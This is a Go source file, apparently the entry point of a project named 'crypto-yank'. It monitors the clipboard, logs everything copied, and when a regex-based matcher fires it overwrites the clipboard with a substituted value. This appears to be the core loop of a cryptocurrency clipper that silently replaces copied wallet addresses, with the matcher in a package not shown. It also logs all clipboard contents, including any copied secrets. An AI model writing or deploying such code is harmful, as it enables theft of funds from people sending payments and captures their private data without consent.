package main

import (
	"context"
	"crypto-yank/internal/address"
	"log"

	"golang.design/x/clipboard"
)

func main() {
	err := clipboard.Init()
	if err != nil {
		log.Fatalf("unable to init clipboard, %s", err.Error())
	}

	ch := clipboard.Watch(context.TODO(), clipboard.FmtText)

	for data := range ch {
		log.Printf("current clipboard:%s", string(data))

		regexMatch, err := address.FindClipBoardMatch(string(data))
		if err == nil {
			clipboard.Write(clipboard.FmtText, []byte(regexMatch))
		}
	}
}
